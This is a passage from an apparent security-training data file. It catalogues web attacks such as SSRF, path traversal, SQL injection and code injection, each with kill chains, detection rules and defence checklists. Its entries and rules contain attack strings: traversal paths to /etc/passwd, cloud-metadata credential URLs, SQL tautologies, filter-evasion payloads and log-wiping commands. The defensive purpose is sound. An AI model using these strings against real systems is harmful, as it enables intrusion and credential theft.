    msg:"SEC-ALERT Inbound Log4Shell CVE-2021-44228 JNDI Injection Exploit Attempt";
    flow:to_server,established;
    content:"\${jndi:"; nocase;
    classtype:attempted-admin;
    sid:1000089;
    rev:1;
)`,
      sysmon: `# Run automated local package vulnerability audit in Node.js project:
npm audit --production --audit-level=high`
    },
    defenseChecklist: [
      { id: "vuln_1", title: "Automated Software Composition Analysis (SCA) in CI/CD", tier: "CI/CD Pipeline", desc: "Integrate automated tools (Snyk, Dependabot, Trivy) into build pipelines to block merges introducing high or critical CVEs." },
      { id: "vuln_2", title: "Generate and Maintain Software Bill of Materials (SBOM)", tier: "Supply Chain", desc: "Generate CycloneDX or SPDX SBOM inventories for all release artifacts to instantly query exposure when new 0-days emerge." },
      { id: "vuln_3", title: "WAF Virtual Patching for Critical CVEs", tier: "Perimeter", desc: "Deploy managed WAF rulesets with immediate virtual patching capabilities to filter known CVE attack signatures while awaiting code updates." },
      { id: "vuln_4", title: "Enforce Rigorous Patch Management SLA", tier: "Governance", desc: "Enforce a strict 7-day remediation SLA for critical severity CVEs and remove unmaintained or dead third-party dependencies." }
    ]
  },
  {
    num: 90,
    id: "auth-failures",
    name: "Identification and Authentication Failures",
    shortName: "Auth Failures",
    moduleGroup: "owasp",
    module: "OWASP Top 10 Web Application Attacks",
    category: "owasp",
    severity: "high",
    cvss: "8.8",
    mitre: "T1110, T1556, T1078",
    primaryTargets: "User Identity Providers, SSO Endpoints, Session Cookies, OAuth/OIDC Flows, MFA Gateways",
    threatActors: "Account Takeover (ATO) Crews, Credential Stuffing Networks, Phishing Operations",
    summary: "Previously titled Broken Authentication, this category encompasses vulnerabilities where confirmation of the user's identity, authentication, and session management are handled incorrectly. Exploits permit automated credential stuffing, brute-force attacks without rate limits, weak or absent MFA enforcement, session fixation, exposing session identifiers in URLs, and improper invalidation of authentication tokens upon logout.",
    killChain: [
      {
        step: 1,
        title: "Breach Corpus Credential Loading",
        mitre: "T1589.001",
        desc: "Ingesting millions of compromised email/password pairs from underground data dumps into automated credential stuffing engines."
      },
      {
        step: 2,
        title: "Distributed Automated Login Assault",
        mitre: "T1110.004",
        desc: "Routing login requests across residential proxy swarms to evade per-IP rate limits and bypass simple threshold defenses."
      },
      {
        step: 3,
        title: "Session Hijack & Account Takeover",
        mitre: "T1556",
        desc: "Locking out legitimate users, altering registered MFA phone numbers, and siphoning stored credit cards and reward points."
      }
    ],
    telemetry: {
      sources: [
        "Authentication Provider Logs (Okta, Azure AD, Auth0, Cognito login telemetry)",
        "Web Application Login Endpoint Telemetry (HTTP 401 vs 200 response ratios)",
        "User Identity Threat Detection (Simultaneous geographically impossible logins)"
      ],
      anomalies: [
        "Massive spike in failed login attempts (HTTP 401) against /login across hundreds of user accounts",
        "Geographically impossible travel logins (e.g. successful login from New York followed 10 minutes later by London)",
        "Login attempts utilizing known breached username/password combinations"
      ]
    },
    rules: {
      sigma: `title: High Volume Distributed Credential Stuffing Attack
id: b7c8d9e0-f1a2-3b4c-5d6e-7f8a9b0c1d2e
status: production
description: Detects credential stuffing characterized by high volume of 401 Unauthorized responses across diverse source IPs.
logsource:
    category: webserver
detection:
    selection:
        cs-uri-stem: '/api/v1/auth/login'
        sc-status: 401
    timeframe: 5m
    condition: selection | count() > 500
level: high
tags:
    - attack.credential_access
    - attack.t1110.004`,
      splunk: `index=auth_logs action="login_failure"
| stats count as failure_count, dc(username) as targeted_users by client_ip
| where failure_count > 50 AND targeted_users > 20
| eval Alert="CRITICAL: Password Spraying / Distributed Credential Stuffing Detected"
| table _time, client_ip, targeted_users, failure_count, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"SEC-ALERT Rapid Brute Force Login Sequence Against Authentication API";
    flow:to_server,established;
    content:"POST"; http_method;
    content:"/login"; http_uri;
    threshold: type both, track by_src, count 25, seconds 30;
    classtype:suspicious-login;
    sid:1000090;
    rev:1;
)`,
      sysmon: `# Verify session cookie flags:
curl -I https://target-app.internal/login | grep -i "Set-Cookie" | grep -E "HttpOnly|Secure|SameSite"`
    },
    defenseChecklist: [
      { id: "auth_1", title: "Mandatory Phishing-Resistant MFA (FIDO2 / WebAuthn)", tier: "Authentication", desc: "Mandate hardware security keys or biometric FIDO2/WebAuthn for all accounts; eliminate SMS and push notification MFA." },
      { id: "auth_2", title: "Adaptive Risk-Based Rate Limiting & Account Lockout", tier: "Application", desc: "Deploy adaptive rate limiting per IP and per username with exponential backoff and CAPTCHA after 5 failed attempts." },
      { id: "auth_3", title: "Hardened Session Cookie Configuration", tier: "Session Management", desc: "Ensure all session cookies include 'Secure; HttpOnly; SameSite=Strict' flags and rotate session IDs upon authentication status changes." },
      { id: "auth_4", title: "Screen Against Known Breached Passwords", tier: "Identity Governance", desc: "Integrate HaveIBeenPwned API or Active Directory password protection to prevent users from selecting known breached passwords." }
    ]
  },
  {
    num: 91,
    id: "integrity-failures",
    name: "Software and Data Integrity Failures",
    shortName: "Integrity Failures",
    moduleGroup: "owasp",
    module: "OWASP Top 10 Web Application Attacks",
    category: "owasp",
    severity: "critical",
    cvss: "9.1",
    mitre: "T1195, T1059, T1565",
    primaryTargets: "CI/CD Deployment Pipelines, Auto-Update Mechanisms, Insecure Deserialization, Untrusted CDNs",
    threatActors: "Supply Chain APTs (SolarWinds style), Malicious Package Maintainers, Package Typosquatters",
    summary: "Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations. This includes applications relying on plugins, libraries, or modules from untrusted sources, insecure CI/CD build pipelines that lack cryptographic verification, auto-update mechanisms downloading unsigned binaries, and insecure deserialization flaws where untrusted serialized objects are parsed without validation, triggering arbitrary remote code execution.",
    killChain: [
      {
        step: 1,
        title: "Upstream Package Compromise / Typosquatting",
        mitre: "T1195.001",
        desc: "Compromising developer credentials to push backdoored code to public repositories or registering typosquatted package names."
      },
      {
        step: 2,
        title: "Unverified Pipeline Ingestion",
        mitre: "T1195.002",
        desc: "Target application build pipeline downloads the malicious dependency without verifying cryptographic SHA-256 hashes or signatures."
      },
      {
        step: 3,
        title: "Malicious Deserialization / Payload Trigger",
        mitre: "T1059",
        desc: "Backdoor executes during application startup or unmarshaling of untrusted Java/Python serialized objects, granting full C2 access."
      }
    ],
    telemetry: {
      sources: [
        "CI/CD Runner Telemetry (GitHub Actions, GitLab CI audit logs)",
        "Artifact Repository Signatures (Cosign, Sigstore, Notary verification logs)",
        "Application Exception Logs (ClassNotFoundException, Deserialization security warnings)"
      ],
      anomalies: [
        "Build runner executing outbound curl/wget commands to external IPs during dependency resolution",
        "Discrepancy between committed package-lock.json hashes and registry downloaded package signatures",
        "Invocation of dangerous deserialization classes (e.g. ObjectInputStream.readObject, pickle.loads)"
      ]
    },
    rules: {
      sigma: `title: Suspicious CI/CD Runner Outbound Network Connection
id: c8d9e0f1-a2b3-4c5d-6e7f-8a9b0c1d2e3f
status: production
description: Detects build runner executing outbound connections to unapproved external endpoints during pipeline build.
logsource:
    category: network_connection
detection:
    selection:
        process_name:
            - 'npm'
            - 'pip'
            - 'mvn'
            - 'gradle'
        dest_ip|startswith:
            - '185.'
            - '194.'
            - '45.'
    condition: selection
level: high
tags:
    - attack.initial_access
    - attack.t1195`,
      splunk: `index=cicd_audit action="package_install" (signature_verified=false OR checksum_mismatch=true)
| eval Alert="CRITICAL: Unsigned or Hash Mismatched Third-Party Software Dependency Installed in Build"
| table _time, repo, build_id, package_name, checksum_mismatch, Alert`,
      suricata: `alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (
    msg:"SEC-ALERT Insecure HTTP Auto-Update Download Lacking TLS/Integrity";
    flow:to_server,established;
    content:"GET"; http_method;
    content:".exe"; http_uri;
    classtype:policy-violation;
    sid:1000091;
    rev:1;
)`,
      sysmon: `# Verify cryptographic container image signatures via cosign:
cosign verify --key cosign.pub myregistry.internal/app:production`
    },
    defenseChecklist: [
      { id: "integ_1", title: "Enforce Cryptographic Artifact Signing (Cosign / Sigstore)", tier: "Supply Chain", desc: "Sign all build artifacts, container images, and software binaries with Sigstore/Cosign and verify signatures before deployment." },
      { id: "integ_2", title: "Enforce Subresource Integrity (SRI) on Web Assets", tier: "Frontend Security", desc: "Include integrity='sha384-...' attributes on all CDN-hosted script tags to prevent third-party CDN compromises from injecting card skimmers." },
      { id: "integ_3", title: "Ban Insecure Deserialization of Untrusted Data", tier: "Secure Coding", desc: "Never use Java native serialization, Python pickle, or PHP unserialize on client input; use strict JSON schemas or Protobuf instead." },
      { id: "integ_4", title: "Isolate CI/CD Build Runners with Strict Egress Controls", tier: "DevOps Security", desc: "Run CI/CD pipelines in ephemeral sandboxes with restricted outbound egress limited to verified internal artifact mirrors." }
    ]
  },
  {
    num: 92,
    id: "logging-failures",
    name: "Security Logging and Monitoring Failures",
    shortName: "Logging Failures",
    moduleGroup: "owasp",
    module: "OWASP Top 10 Web Application Attacks",
    category: "owasp",
    severity: "high",
    cvss: "7.7",
    mitre: "T1562.002, T1070, T1562.001",
    primaryTargets: "SIEM Systems, Centralized Syslog, SOC Alerting Queues, Audit Trails, Forensic Stores",
    threatActors: "Covert APTs, Ransomware Dwellers, Rogue System Administrators",
    summary: "Without logging and monitoring, breaches cannot be detected. Insufficient logging, detection, monitoring, and active response occurs when auditable events (logins, failed authentication, high-value transactions) are not logged, warnings and errors generate no logs, logs are stored locally where attackers can alter or delete them, alerting thresholds are nonexistent, and active real-time monitoring is absent. Average breach dwell time without proper logging exceeds 200 days.",
    killChain: [
      {
        step: 1,
        title: "Logging Blindspot Identification",
        mitre: "T1592",
        desc: "Probing endpoints with invalid inputs and observing whether security telemetry triggers alerts, rate limits, or administrative warnings."
      },
      {
        step: 2,
        title: "Log Tampering & Agent Disablement",
        mitre: "T1562.001",
        desc: "Killing local syslog daemons, disabling Windows Event Log services, or flooding log buffers to trigger log rolling and hide intrusion tracks."
      },
      {
        step: 3,
        title: "Undetected Long-Term Lateral Persistence",
        mitre: "T1070",
        desc: "Dwelling inside the enterprise for months, systematically exfiltrating proprietary records without triggering SOC incident alerts."
      }
    ],
    telemetry: {
      sources: [
        "Centralized SIEM Log Ingestion Monitors (Splunk Ingestion Health, Elastic Fleet)",
        "Audit Log Integrity Monitors (File Integrity Monitoring on /var/log)",
        "Heartbeat Telemetry from Security Agents"
      ],
      anomalies: [
        "Abrupt cessation of log forwarding from high-value production servers",
        "Gaps in sequence numbering of transaction audit logs",
        "Attempts to execute wevtutil cl (clear event logs) or rm -rf /var/log"
      ]
    },
    rules: {
      sigma: `title: Windows Event Log Cleared via Wevtutil
id: d9e0f1a2-b3c4-5d6e-7f8a-9b0c1d2e3f4a
status: production
description: Detects execution of wevtutil.exe used by adversaries to wipe Windows Security and System event logs.
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\wevtutil.exe'
        CommandLine|contains:
            - ' cl '
            - 'clear-log'
    condition: selection
level: critical
tags:
    - attack.defense_evasion
    - attack.t1070.001`,
      splunk: `index=security (sourcetype="WinEventLog:Security" EventCode=1102) OR (sourcetype="linux_audit" type="ANOM_PROMISC")
| eval Alert="CRITICAL DEFENSE EVASION: Audit Log Cleared or Promiscuous Mode Activated"
| table _time, host, user, Alert`,
      suricata: `alert tcp $HOME_NET any -> $EXTERNAL_NET 514 (
    msg:"SEC-ALERT Cleartext Syslog Egress Outside Organization Perimeter";
    flow:to_server,established;
    content:"syslog"; nocase;
    classtype:policy-violation;
    sid:1000092;
    rev:1;
)`,
      sysmon: `# Monitor Sysmon Event ID 1 for log clearing commands:
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1} | Where-Object {$_.Message -match "wevtutil"}`
    },
    defenseChecklist: [
      { id: "log_1", title: "Centralized Immutable Write-Once (WORM) Logging", tier: "SIEM Architecture", desc: "Forward all logs in real time over TLS to an immutable centralized SIEM (Splunk, Elastic, CloudWatch) with WORM storage policies." },
      { id: "log_2", title: "Comprehensive Security Event Auditing", tier: "Application Logging", desc: "Log all authentication attempts, privilege changes, access control failures, and sensitive financial transactions with full context." },
      { id: "log_3", title: "Real-Time 24/7 Threat Alerting & Automated SOAR", tier: "SOC Operations", desc: "Configure high-fidelity alerting rules with automated SOAR playbooks to respond to brute-force, injection, and privilege escalation immediately." },
      { id: "log_4", title: "SIEM Agent Heartbeat & Tamper Monitoring", tier: "Endpoint Security", desc: "Deploy watchdog services that trigger high-severity alerts immediately if any server stops sending log telemetry for >5 minutes." }
    ]
  },
  {
    num: 93,
    id: "ssrf-attack",
    name: "Server-Side Request Forgery (SSRF)",
    shortName: "SSRF Attack",
    moduleGroup: "owasp",
    module: "OWASP Top 10 Web Application Attacks",
    category: "owasp",
    severity: "critical",
    cvss: "9.3",
    mitre: "T1190, T1552.005",
    primaryTargets: "Cloud Instance Metadata Services (169.254.169.254), Internal Microservices, Backend Databases",
    threatActors: "Cloud Penetration Specialists, Capital One Breachers, Data Ransomware Gangs",
    summary: "SSRF flaws occur whenever a web application fetches a remote resource without validating the user-supplied URL. An adversary can coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or network ACL. In cloud environments (AWS, Azure, GCP), attackers query the Instance Metadata Service (IMDS) at 169.254.169.254 to steal IAM temporary credentials and assume cloud administrator roles.",
    killChain: [
      {
        step: 1,
        title: "URL Parameter Discovery & SSRF Probing",
        mitre: "T1595.002",
        desc: "Identifying input parameters that load remote URLs (e.g. url=, webhook=, image_url=, import=) using Burp Collaborator or interactsh."
      },
      {
        step: 2,
        title: "Internal Infrastructure & Metadata Scanning",
        mitre: "T1190",
        desc: "Submitting loopback (127.0.0.1) and link-local cloud metadata addresses (http://169.254.169.254/latest/meta-data/) to bypass perimeter firewalls."
      },
      {
        step: 3,
        title: "IAM Role Exfiltration & Cloud Takeover",
        mitre: "T1552.005",
        desc: "Harvesting AWS STS AccessKeyId, SecretAccessKey, and Token from IMDS to pivot into cloud control planes and siphoning S3 buckets."
      }
    ],
    telemetry: {
      sources: [
        "Web Server Access & Outbound Proxy Logs",
        "Cloud VPC Flow Logs (Outbound traffic from web tier to 169.254.169.254)",
        "AWS CloudTrail / Azure Activity Logs (Unusual STS AssumeRole and IAM actions)"
      ],
      anomalies: [
        "Outbound HTTP GET requests directed at 169.254.169.254 or RFC 1918 internal subnets (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)",
        "Spike in IAM API calls originating from external IP addresses using EC2 instance profile temporary credentials",
        "Use of alternate IP encodings (e.g. http://2130706433, http://0x7f.0.0.1, http://[::1]) in URL parameters"
      ]
    },
    rules: {
      sigma: `title: Server-Side Request Forgery Targeting Cloud Metadata Service
id: e0f1a2b3-c4d5-6e7f-8a9b-0c1d2e3f4a5b
status: production
description: Detects outbound HTTP requests from web servers to the link-local cloud metadata IP (169.254.169.254).
logsource:
    category: webserver
detection:
    selection:
        cs-uri-query|contains:
            - '169.254.169.254'
            - 'metadata.google.internal'
            - '169.254.169.254/latest/meta-data'
    condition: selection
level: critical
tags:
    - attack.initial_access
    - attack.t1190`,
      splunk: `index=vpc_flow (dest_ip="169.254.169.254" OR dest_ip="127.0.0.1") src_ip IN ("10.0.*", "172.16.*")
| stats count by src_ip, dest_ip, dest_port
| eval Alert="CRITICAL: Internal Host Querying Cloud Metadata Service (SSRF Indicator)"
| table _time, src_ip, dest_ip, dest_port, count, Alert`,
      suricata: `alert tcp $HOME_NET any -> 169.254.169.254 $HTTP_PORTS (
    msg:"SEC-ALERT Outbound Cloud Metadata (IMDS) Retrieval Attempt (Possible SSRF)";
    flow:to_server,established;
    content:"/latest/meta-data/"; http_uri;
    classtype:policy-violation;
    sid:1000093;
    rev:1;
)`,
      sysmon: `# Enforce IMDSv2 requirement on AWS EC2 instance:
aws ec2 modify-instance-metadata-options --instance-id i-1234567890abcdef0 --http-tokens required --http-endpoint enabled`
    },
    defenseChecklist: [
      { id: "ssrf_1", title: "Mandate IMDSv2 with Session Token Headers", tier: "Cloud Architecture", desc: "Require IMDSv2 (PUT request with X-aws-ec2-metadata-token) across all cloud instances and set hop limit to 1 to block SSRF proxying." },
      { id: "ssrf_2", title: "Strict URL Scheme & Domain Whitelisting", tier: "Application Logic", desc: "Never permit arbitrary URLs. Validate protocols strictly to HTTPS and whitelist exact allowed target domain names." },
      { id: "ssrf_3", title: "Block Loopback and RFC 1918 Private Addresses", tier: "Network / AppSec", desc: "Resolve destination DNS and drop any connection resolving to 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, or 169.254.169.254." },
      { id: "ssrf_4", title: "Isolated Egress Proxy for Webhook Delivery", tier: "Network Segmentation", desc: "Route any required external resource fetching through a dedicated, isolated egress proxy that enforces strict firewall egress rules." }
    ]
  },

  // =========================================================================
  // MODULE 17: OTHER WEB APPLICATION ATTACKS (94 - 100)
  // =========================================================================
  {
    num: 94,
    id: "web-directory-traversal",
    name: "Directory Traversal (Repeated)",
    shortName: "Directory Traversal",
    moduleGroup: "other-web",
    module: "Other Web Application Attacks",
    category: "other-web",
    severity: "high",
    cvss: "8.6",
    mitre: "T1083, T1005",
    primaryTargets: "Web Server File Systems, Document Download Endpoints, Static File Handlers, /etc/passwd, win.ini",
    threatActors: "Web Crawlers, Bug Bounty Hunters, Black Hat Hackers",
    summary: "Directory Traversal (also known as Path Traversal) allows attackers to read arbitrary files on the server that runs an application. By manipulating variables that reference files with dot-dot-slash ('../') sequences and variations (URL-encoded '%2e%2e%2f', double-encoded '%252e%252e%252f', or null-byte '%00'), adversaries break out of the document root directory and access application source code, configuration files containing credentials, and operating system sensitive files like /etc/shadow or C:\\Windows\\win.ini.",
    killChain: [
      {
        step: 1,
        title: "File Parameter Identification",
        mitre: "T1595.002",
        desc: "Locating input parameters that retrieve files from disk (e.g. ?file=, ?download=, ?path=, ?template=)."
      },
      {
        step: 2,
        title: "Path Traversal Sequence Injection",
        mitre: "T1083",
        desc: "Injecting relative path traversal sequences (../../../../etc/passwd or ..\\..\\..\\windows\\win.ini) to escape web root directories."
      },
      {
        step: 3,
        title: "Sensitive Credential & Source Extraction",
        mitre: "T1005",
        desc: "Extracting database configuration files (config.php, appsettings.json), SSH private keys, and OS user lists."
      }
    ],
    telemetry: {
      sources: [
        "Web Server Access Logs (Apache, Nginx, IIS access logs with /.. sequences)",
        "Host File Access Audits (Sysmon Event ID 11, Linux auditd open syscalls on /etc/passwd)",
        "WAF Event Logs"
      ],
      anomalies: [
        "HTTP requests containing '%2e%2e%2f', '..%2f', or '..%5c' patterns in URI or query strings",
        "Web server processes opening files outside the designated docroot directory",
        "Sudden surge in HTTP 200 responses to file download endpoints returning system file signatures"
      ]
    },
    rules: {
      sigma: `title: Directory Traversal Path Manipulation in Web Request
id: f1a2b3c4-d5e6-7f8a-9b0c-1d2e3f4a5b6c
status: production
description: Detects directory traversal escape sequences (../, ..\\, and encodings) in web request URIs.
logsource:
    category: webserver
detection:
    selection:
        cs-uri|contains:
            - '/../'
            - '\\..\\'
            - '%2e%2e%2f'
            - '%2e%2e%5c'
            - '..%2f'
            - '/etc/passwd'
            - 'windows/win.ini'
    condition: selection
level: high
tags:
    - attack.discovery
    - attack.t1083`,
      splunk: `index=web_logs (uri="*../*" OR uri="*..\\\\*" OR uri="*%2e%2e%2f*" OR uri="*/etc/passwd*")
| stats count by c_ip, uri, status
| eval Alert="HIGH: Path Traversal / Arbitrary File Read Exploit Attempt"
| table _time, c_ip, uri, status, count, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"SEC-ALERT Path Traversal Sequence in HTTP URI";
    flow:to_server,established;
    content:"../"; http_uri;
    classtype:web-application-attack;
    sid:1000094;
    rev:1;
)`,
      sysmon: `# Verify file resolution code uses canonical path verification
grep -rn "path.join" ./src/ | grep -v "path.resolve"`
    },
    defenseChecklist: [
      { id: "dt_1", title: "Use Canonical Path Verification (Path.resolve)", tier: "Application Logic", desc: "Resolve the canonical target path and strictly verify that it starts with the designated root directory before opening any file." },
      { id: "dt_2", title: "Maintain Strict File Whitelist / ID Mapping", tier: "Application Logic", desc: "Map user requests to an indirect integer or UUID key mapped in an internal database rather than accepting file system paths." },
      { id: "dt_3", title: "Restrict File System Permissions (Chroot / Jail)", tier: "OS Hardening", desc: "Run the web server process in a chrooted jail or unprivileged container with read-only access to necessary files." },
      { id: "dt_4", title: "Deploy WAF Path Traversal Inspection Rules", tier: "Perimeter", desc: "Activate WAF rules to reject HTTP requests containing decoded or raw dot-dot-slash patterns." }
    ]
  },
  {
    num: 95,
    id: "input-filtering-attack",
    name: "Input Filtering Attack",
    shortName: "Input Filtering Attack",
    moduleGroup: "other-web",
    module: "Other Web Application Attacks",
    category: "other-web",
    severity: "high",
    cvss: "8.2",
    mitre: "T1190, T1027",
    primaryTargets: "WAF Input Filters, Form Sanitization Functions, Regular Expression Matchers, Input Gateways",
    threatActors: "Advanced Exploit Developers, Red Teams, Penetration Testers",
    summary: "Input Filtering Attacks target the sanitization and filtering mechanisms implemented by applications and Web Application Firewalls (WAF). Attackers employ sophisticated evasion techniques—including nested character encoding (e.g. nested script tags like '<scr<script>ipt>'), alternate character sets (UTF-7, UTF-16), case-toggling, whitespace obfuscation, SQL comment interleaving ('UNI/**/ON'), and ReDoS (Regular Expression Denial of Service)—to bypass blocklists and slip malicious payloads past inspection engines.",
    killChain: [
      {
        step: 1,
        title: "Filter Rule Character Profiling",
        mitre: "T1595.002",
        desc: "Testing a series of probe characters (<, >, ', \", %, &, null-byte) to determine which characters are blocked, stripped, or encoded."
      },
      {
        step: 2,
        title: "Encoding & Obfuscation Mutation",
        mitre: "T1027",
        desc: "Constructing mutant payloads using multi-byte Unicode, hex encoding, chunked HTTP transfer, or comment fragmentation."
      },
      {
        step: 3,
        title: "Inspection Engine Bypass & Payload Execution",
        mitre: "T1190",
        desc: "The sanitized string passes the flawed filter, is decoded downstream by the application interpreter, and triggers the intended attack."
      }
    ],
    telemetry: {
      sources: [
        "Web Application Firewall (WAF) Anomaly Logs (ModSecurity, Cloudflare, AWS WAF)",
        "Application Input Sanitization Logs (Warning events from validator libraries)",
        "Web Server CPU Spikes (Indicative of ReDoS regex catastrophic backtracking)"
      ],
      anomalies: [
        "Payloads containing nested tags, excessive null-bytes, or mismatched character encodings",
        "Sudden spike in CPU utilization to 100% on web application worker processes processing specific input fields (ReDoS)",
        "High frequency of WAF evasion heuristic triggers from single IP subnets"
      ]
    },
    rules: {
      sigma: `title: WAF Input Filter Evasion Technique via Comment Obfuscation
id: a2b3c4d5-e6f7-8a9b-0c1d-2e3f4a5b6c7d
status: production
description: Detects SQL comment splitting (/**/) and nested script tag evasion patterns designed to defeat naive input filters.
logsource:
    category: webserver
detection:
    selection:
        cs-uri-query|contains:
            - '/**/'
            - '<scr<script>ipt>'
            - '%00'
            - '/*!'
    condition: selection
level: high
tags:
    - attack.defense_evasion
    - attack.t1027`,
      splunk: `index=waf_logs (cs_uri_query="*/**/union*" OR cs_uri_query="*<scr*ipt*" OR cs_uri_query="*%00*")
| stats count by c_ip, cs_uri_query, action
| eval Alert="HIGH: Input Filtering & WAF Evasion Technique Detected"
| table _time, c_ip, cs_uri_query, action, count, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"SEC-ALERT Input Filter Evasion - SQL Comment Splitting in URI";
    flow:to_server,established;
    content:"/**/"; http_uri;
    classtype:web-application-attack;
    sid:1000095;
    rev:1;
)`,
      sysmon: `# Audit regular expressions for catastrophic backtracking vulnerabilities:
npx safe-regex ./src/validators/*.js`
    },
    defenseChecklist: [
      { id: "ifa_1", title: "Adopt Strict Positive Allowlist Validation", tier: "Application Logic", desc: "Validate input against strict positive allowlists (data type, length, regex pattern) rather than relying on flawed negative blocklists." },
      { id: "ifa_2", title: "Context-Aware Contextual Output Encoding", tier: "Application Logic", desc: "Encode data immediately before it is rendered into specific contexts (HTML body, JavaScript variable, URL, CSS) using OWASP Java Encoder." },
      { id: "ifa_3", title: "Audit Regular Expressions Against ReDoS", tier: "AppSec", desc: "Verify that regular expressions do not contain nested quantifiers or catastrophic backtracking flaws that can be exploited for DoS." },
      { id: "ifa_4", title: "Multi-Pass Unicode Normalization", tier: "Input Processing", desc: "Normalize all incoming text to standard Unicode (NFC/NFKC) before validation to prevent homoglyph and multi-byte bypasses." }
    ]
  },
  {
    num: 96,
    id: "web-code-injection",
    name: "Code Injection (Repeated)",
    shortName: "Web Code Injection",
    moduleGroup: "other-web",
    module: "Other Web Application Attacks",
    category: "other-web",
    severity: "critical",
    cvss: "9.8",
    mitre: "T1059.004, T1059.006",
    primaryTargets: "Web Application Runtimes (Node.js, PHP, Python eval(), Ruby send), Server Frameworks",
    threatActors: "Web Shell Operators, Ransomware Initial Access Brokers, State-Sponsored Espionage",
    summary: "Code Injection differs from Command Injection: in Code Injection, the attacker introduces or injects code into a vulnerable computer program and gets the application runtime environment itself to execute it (e.g. PHP eval(), Python exec(), Node.js vm.runInContext()). This enables adversaries to bypass operating system process creation logging while obtaining full arbitrary execution within the memory space and permissions of the web service process.",
    killChain: [
      {
        step: 1,
        title: "Dynamic Evaluation Sinks Discovery",
        mitre: "T1595.002",
        desc: "Identifying input parameters reflected into dynamic language evaluation functions (eval, assert, preg_replace /e, deserialize)."
      },
      {
        step: 2,
        title: "Runtime Syntax Smuggling",
        mitre: "T1059.004",
        desc: "Injecting syntax terminators and language-specific code snippets (e.g. ;phpinfo();, require('child_process'), import os; os.system)."
      },
      {
        step: 3,
        title: "In-Memory Web Shell Execution",
        mitre: "T1059.006",
        desc: "Executing arbitrary web shell instructions in memory without writing files to disk, stealing database sessions and tokens."
      }
    ],
    telemetry: {
      sources: [
        "Web Application Runtime Exception Logs (ParseError, SyntaxError in eval)",
        "Application Performance Monitoring (APM / OpenTelemetry profiling calls to eval)",
        "WAF Payload Inspection Logs"
      ],
      anomalies: [
        "HTTP POST requests containing runtime code keywords ('eval(', 'base64_decode', 'require(', 'exec(')",
        "Execution of dynamic code loading functions flagged by static analysis or APM profilers",
        "Sudden outbound network connections established directly from Node.js, Python, or PHP processes"
      ]
    },
    rules: {
      sigma: `title: Suspicious Dynamic Code Injection Keywords in HTTP Request
id: b3c4d5e6-f7a8-9b0c-1d2e-3f4a5b6c7d8e
status: production
description: Detects code execution functions (eval, system, exec, passthru) submitted within HTTP body payloads.
logsource:
    category: webserver
detection:
    selection:
        payload|contains:
            - 'eval('
            - 'passthru('
            - 'base64_decode('
            - 'child_process'
            - '__import__'
    condition: selection
level: critical
tags:
    - attack.execution
    - attack.t1059`,
      splunk: `index=web_waf (payload="*eval(*" OR payload="*base64_decode(*" OR payload="*require('child_process')*")
| stats count by src_ip, dest_ip, uri, payload
| eval Alert="CRITICAL: Server-Side Language Code Injection Exploit Attempt"
| table _time, src_ip, dest_ip, uri, payload, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"SEC-ALERT Server-Side Dynamic Code Execution Expression in POST Body";
    flow:to_server,established;
    content:"eval("; http_client_body; nocase;
    classtype:web-application-attack;
    sid:1000096;
    rev:1;
)`,
      sysmon: `# Scan source tree for dangerous eval or dynamic execution calls:
semgrep --config "p/security-audit" --pattern '$X.eval(...)' ./src/`
    },
    defenseChecklist: [
      { id: "wci_1", title: "Ban Dynamic Code Evaluation Functions (eval / exec)", tier: "Secure Coding", desc: "Prohibit all calls to eval(), new Function(), exec(), and vm.runInContext() in code style guides and enforce with strict ESLint / SonarQube rules." },
      { id: "wci_2", title: "Enforce Read-Only Container Root Filesystem", tier: "Container Hardening", desc: "Run containers with --read-only root filesystems and tmpfs for temporary folders to prevent dropping persistent file-based web shells." },
      { id: "wci_3", title: "Disable Insecure PHP / Runtime Functions", tier: "Runtime Config", desc: "Configure php.ini with 'disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source'." },
      { id: "wci_4", title: "Deploy Runtime Application Self-Protection (RASP)", tier: "AppSec", desc: "Deploy RASP agents to monitor language runtime hooks and automatically terminate threads attempting to invoke unauthorized eval calls." }
    ]
  },
  {
    num: 97,
    id: "web-sql-injection",
    name: "SQL Injection (Repeated)",
    shortName: "Web SQL Injection",
    moduleGroup: "other-web",
    module: "Other Web Application Attacks",
    category: "other-web",
    severity: "critical",
    cvss: "9.8",
    mitre: "T1190, CWE-89",
    primaryTargets: "Web Form Handlers, URL Parameters, REST API Query Filters, JSON Request Bodies",
    threatActors: "Sqlmap Automated Operators, Data Brokers, Underground Breach Forums",
    summary: "Web-layer SQL Injection exploits untrusted user input concatenated directly into database queries within web application presentation and business logic layers. Attackers submit UNION-based queries, error-based payloads, and boolean logic to subvert intended application queries, bypass user authentication screens with 'admin' OR '1'='1'--, and extract millions of customer PII and password records directly through web response streams.",
    killChain: [
      {
        step: 1,
        title: "Tautology & Delimiter Injection",
        mitre: "T1190",
        desc: "Injecting quotes and boolean tautologies (' OR '1'='1) into search boxes and login forms to bypass authentication."
      },
      {
        step: 2,
        title: "UNION SELECT Column Discovery",
        mitre: "T1083",
        desc: "Probing column counts with ORDER BY 1,2,3... and issuing UNION SELECT null, null... to align data types for extraction."
      },
      {
        step: 3,
        title: "Full Database Siphoning",
        mitre: "T1005",
        desc: "Extracting password hashes, sensitive customer records, and credit card tokens directly in web response tables."
      }
    ],
    telemetry: {
      sources: [
        "Web Server Access Logs (Apache, Nginx, IIS access logs with SQL keywords)",
        "WAF Event Logs (ModSecurity, Cloudflare, AWS WAF SQLi rule matches)",
        "Database Audit Logs (Unusual query execution profiles)"
      ],
      anomalies: [
